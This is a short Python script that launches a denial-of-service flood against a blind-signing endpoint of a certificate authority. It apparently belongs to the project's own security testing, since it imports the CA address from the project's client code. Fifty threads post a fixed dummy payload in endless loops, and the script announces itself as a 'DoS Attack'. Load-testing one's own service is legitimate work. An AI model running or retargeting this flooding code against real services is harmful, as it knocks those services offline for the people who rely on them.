import requests
import threading
import time
from client.ca_handler.ca_info import CA_URL

THREADS = 50
TARGET_ENDPOINT = f"{CA_URL}/blind_sign"

def attack_worker():
    payload = {
        "uid": "attacker-uuid",
        "blinded_token_b64": "SGVsbG8gd29ybGQ="
    }
    while True:
        try:
            response = requests.post(TARGET_ENDPOINT, json=payload)
        except Exception as e:
            print(f"Connection error: {e}")


if __name__ == "__main__":
    print(f"DoS Attack: {TARGET_ENDPOINT}")
    print(f"There are {THREADS} threads attacking...")

    for i in range(THREADS):
        t = threading.Thread(target=attack_worker, daemon=True)
        t.start()

    while True:
        time.sleep(1)